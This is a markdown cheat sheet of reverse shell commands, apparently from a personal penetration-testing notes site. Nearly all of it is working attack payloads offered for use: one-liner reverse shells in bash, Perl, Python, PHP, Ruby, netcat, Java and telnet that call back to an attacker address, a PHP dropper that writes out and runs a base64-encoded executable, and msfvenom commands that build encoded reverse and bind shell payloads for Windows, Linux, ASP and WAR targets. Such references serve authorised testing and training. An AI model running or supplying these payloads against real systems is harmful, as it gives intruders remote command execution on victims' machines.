---
layout: commands
title: Reverse Shells
date: 2020-08-13
preview: Cheatsheet for reverse shells
categories: 
    - "commands"
    - "pentest"
---

# Reverse Shells

Credits to PentestMonkey - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Another great resource - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## Perl

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python

### Python 2

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python 3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

### Linux

```bash
php -r '$sock=fsockopen("10.0.0.1",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 EXITFUNC=thread -f exe | base64 -w 0
```

Create shell.php (Or whatever you want to call it!)

```bash
<?php
header('Content-type: text/plain');
$payload = "OUTPUT FROM ABOVE COMMAND";
$evalCode = base64_decode($payload);
$filename = "s.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
?>
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",9001).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat

### Linux

```bash
nc -e /bin/sh 10.0.0.1 9001
```

Net cat reliable

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 9001 >/tmp/f
```

### Windows

cmd.exe

```bash
nc -e cmd.exe 10.0.0.1 9001
```

powershell.exe

```bash
nc -e powershell.exe 10.0.0.1 9001
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```


## Xterm

```bash
xterm -display 10.0.0.1:1
```

## Telnet

### Linux

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
```

### Windows

```bash
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
```

\# Remember to listen on your machine also on port 4445/tcp


# Metasploit payloads

## Windows to netcat

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -e x86/shikata_ga_nai -b <BADCHARS>
```

## Javascript

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 -f js_le -e generic/none
```

## Windows EXE

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 EXITFUNC=thread -f exe > shell.exe
```

## Unix Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=10.0.0.1 LPORT=9001 -f raw > shell.pl
```

## Unix

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=9001 -f raw > web/shell.sh
```

## Linux Bind

```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=9001 -f c -b "<BADCHARS>" --platform linux -a x86 -e x86/shikata_ga_nai
```

## Windows Powershell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 -f psh
```

## C Alpha Numeric

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$TARGETIP LPORT=<PORT> -f c -e x86/alpha_mixed -b "<BADCHARS>"
```

## ASP

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 -f asp > sc.asp
```

# WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 -f war > shell.war
```

